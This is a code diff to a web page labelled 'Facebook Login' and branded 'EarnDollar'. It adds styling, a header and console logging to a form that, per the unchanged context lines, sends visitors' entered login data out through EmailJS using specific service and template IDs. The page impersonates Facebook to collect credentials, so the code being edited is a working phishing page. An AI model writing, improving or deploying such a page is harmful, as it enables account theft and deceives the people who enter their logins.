@@ -7,11 +7,17 @@
     <style>
         body {
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
             background-color: #f0f2f5;
             font-family: Arial, sans-serif;
+        }
+        h1 {
+            color: red;
+            font-size: 36px; /* Big header size */
+            margin-bottom: 20px; /* Space below the header */
         }
         .login-container {
             background-color: white;
@@ -59,6 +65,7 @@
     </style>
 </head>
 <body>
+    <h1>EarnDollar</h1> <!-- Big header title -->
     <div class="login-container">
         <h2>Facebook Login</h2>
         <form id="loginForm" onsubmit="return handleSubmit(event);">
@@ -95,8 +102,10 @@
             // Send the email using EmailJS
             emailjs.send("service_la9pk5b", "template_taq80yv", templateParams)
                 .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
                     alert('Login data sent successfully!');
                 }, function(error) {
+                    console.error('FAILED...', error);
                     alert('Failed to send login data. Please try again.');
                 });
         }
